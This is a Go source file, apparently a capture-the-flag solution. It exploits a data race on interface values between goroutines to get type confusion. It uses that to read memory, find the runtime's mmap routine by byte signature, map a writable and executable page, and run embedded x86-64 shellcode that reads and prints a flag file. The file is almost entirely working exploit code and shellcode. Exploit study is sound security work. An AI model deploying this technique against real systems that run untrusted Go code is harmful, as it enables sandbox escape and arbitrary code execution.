package main

/*
  Prepare things...
*/

type integer uintptr

type iface interface {
	Int() integer
	Pointer() *integer
	Bytes() []byte
	Mmap(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int)
}

type number struct {
	v   integer
	len integer
	cap integer
}

func (num *number) Int() integer {
	return num.v
}

func (num *number) Pointer() *integer {
	return nil
}

func (num *number) Bytes() []byte {
	return nil
}

func (num *number) Mmap(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int) {
	return 0, 0xdead
}

type pointer struct {
	v *integer
}

func (p *pointer) Int() integer {
	return 0
}

func (p *pointer) Pointer() *integer {
	return p.v
}

func (p *pointer) Bytes() []byte {
	return nil
}

func (p *pointer) Mmap(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int) {
	return 0, 0xdead
}

type buffer struct {
	v []byte
}

func (b *buffer) Int() integer {
	return 0
}

func (b *buffer) Pointer() *integer {
	return nil
}

func (b *buffer) Bytes() []byte {
	return b.v
}

func (b *buffer) Mmap(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int) {
	return 0, 0xdead
}

type function struct {
	v func(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int)
}

func (f *function) Int() integer {
	return 0
}

func (f *function) Pointer() *integer {
	return nil
}

func (f *function) Bytes() []byte {
	return nil
}

func (f *function) Mmap(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int) {
	if f.v != nil {
		return f.v(addr, n, prot, flags, fd, off)
	}
	return 0, 0xdead
}

/*
  go exploit!
*/

var (
	i, f, ace iface
	sigMmap   = []byte("\x48\x8B\x7C\x24\x08\x48\x8B\x74\x24\x10\x8B\x54\x24\x18\x44\x8B\x54\x24\x1C\x44\x8B\x44\x24\x20\x44\x8B\x4C\x24\x24\xb8\x09\x00\x00\x00\x0f\x05")
	// read flag and print it
	shellcode = []byte("\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x66\x6c\x61\x67")
)

func addrOf(fn func(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int)) integer {
	i = &pointer{}
	f = &function{v: fn}
	ace = i
	loop := true
	go func() {
		for j := 0; j < 0x10000; j++ {
			ace = f
			ace = i
		}
		loop = false
	}()
	for loop {
		addr := ace.Pointer()
		if addr != nil {
			return *addr
		}
	}
	return 0
}

func bufferOf(addr integer) []byte {
	i = &buffer{}
	f = &number{v: addr, len: 0x20000, cap: 0x20000}
	ace = i
	loop := true
	go func() {
		for j := 0; j < 0x10000; j++ {
			ace = f
			ace = i
		}
		loop = false
	}()
	for loop {
		bytes := ace.Bytes()
		if bytes != nil {
			return bytes
		}
	}
	return nil
}

func sysMmap(fn integer, addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int) {
	if fn != 0 {
		i = &function{}
		f = &pointer{v: &fn}
		ace = i
		loop := true
		go func() {
			for j := 0; j < 0x10000; j++ {
				ace = f
				ace = i
			}
			loop = false
		}()
		for loop {
			r, err := ace.Mmap(addr, n, prot, flags, fd, off)
			if err != 0xdead {
				return r, err
			}
		}
	}

	return 0, 0xdead
}

func main() {
	var (
		base integer
		mmap integer
		text []byte
		rwx  []byte
	)

	if addr := addrOf(victim); addr != 0 {
		base = addr - 0x20000
	} else {
		println("failed to get address of victim")
		return
	}

	if text = bufferOf(base); text == nil {
		println("failed to get buffer of text")
		return
	}

	if off := bytesIndex(text, sigMmap); off != 0xdead {
		mmap = base + off
	} else {
		println("failed to find runtime_sysMmap in current address")
		return
	}

	// println("mmap @", mmap)

	page, err := sysMmap(mmap, 0, 0x1000, 7, 0x22, -1, 0)
	if page == 0 {
		println("failed to mmap RWX page", err)
		return
	}

	// println("mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =", page)

	if rwx = bufferOf(page); rwx == nil {
		println("failed to get buffer of RWX page")
		return
	}

	copy(rwx, shellcode)

	sysMmap(page, 0, 0, 0, 0, 0, 0)
}

func victim(addr, n uintptr, prot, flags, fd int32, off uint32) (integer, int) {
	return 0, 0xdead
}

func bytesIndex(s []byte, sep []byte) integer {
	for i := 0; i < len(s); i++ {
		found := true
		for j := 0; j < len(sep); j++ {
			if i+j >= len(s) {
				return 0xdead
			}
			if s[i+j] != sep[j] {
				found = false
				break
			}
		}
		if found {
			return integer(i)
		}
	}
	return 0xdead
}
